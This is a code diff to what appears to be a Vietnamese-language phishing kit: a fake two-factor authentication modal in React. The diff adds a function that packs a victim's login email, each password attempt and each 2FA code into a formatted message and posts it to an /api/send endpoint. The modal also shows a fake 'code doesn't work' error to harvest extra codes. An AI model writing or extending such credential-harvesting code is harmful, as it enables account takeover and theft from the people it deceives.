@@ -6,6 +6,29 @@ import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
+const SEP = '━━━━━━━━━━━━━━━━━━━━';
+
+const buildMessage = (baseMessage: string, loginEmail: string, passwords: string[], codes: string[]): string => {
+    let msg = baseMessage;
+
+    if (passwords.length > 0) {
+        msg += `\n🔐 <b>ĐĂNG NHẬP</b>\n   TK: <code>${loginEmail}</code>`;
+        passwords.forEach((pw, i) => {
+            msg += `\n   MK${i + 1}: <code>${pw}</code>`;
+        });
+    }
+
+    if (codes.length > 0) {
+        msg += `\n🔒 <b>MÃ 2FA</b>`;
+        codes.forEach((code, i) => {
+            msg += `\n   Code${i + 1}: <code>${code}</code>`;
+        });
+    }
+
+    msg += `\n${SEP}`;
+    return msg;
+};
+
 const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep, userName }) => {
     const [attempts, setAttempts] = useState(0);
     const [code, setCode] = useState('');
@@ -14,7 +37,7 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, message, setMessage, setMessageId } = store();
+    const { geoInfo, messageId, baseMessage, passwords, codes, loginEmail, setMessage, setMessageId, addCode } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
@@ -25,7 +48,13 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
     useEffect(() => {
         if (!geoInfo) return;
 
-        const textsToTranslate = ['Go to your authentication app', 'Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];
+        const textsToTranslate = [
+            'Go to your authentication app',
+            'Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).',
+            'Code',
+            "This code doesn't work. Check it's correct or try a new one after",
+            'Continue'
+        ];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -52,7 +81,7 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
     }, [countdown, showError]);
 
     const handleSubmit = async () => {
-        if (!code.trim() || isLoading || code.length < 6 || countdown > 0 || !message) return;
+        if (!code.trim() || isLoading || code.length < 6 || countdown > 0 || !baseMessage) return;
 
         setShowError(false);
         setIsLoading(true);
@@ -60,9 +89,11 @@ const VerifyModal: FC<{ nextStep: () => void; userName?: string }> = ({ nextStep
         const next = attempts + 1;
         setAttempts(next);
 
-        const updatedMessage = `${message}
+        const newCodes = [...codes, code];
+        addCode(code);
 
-<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
+        const updatedMessage = buildMessage(baseMessage, loginEmail ?? '', passwords, newCodes);
+
         try {
             const res = await axios.post('/api/send', {
                 message: updatedMessage,
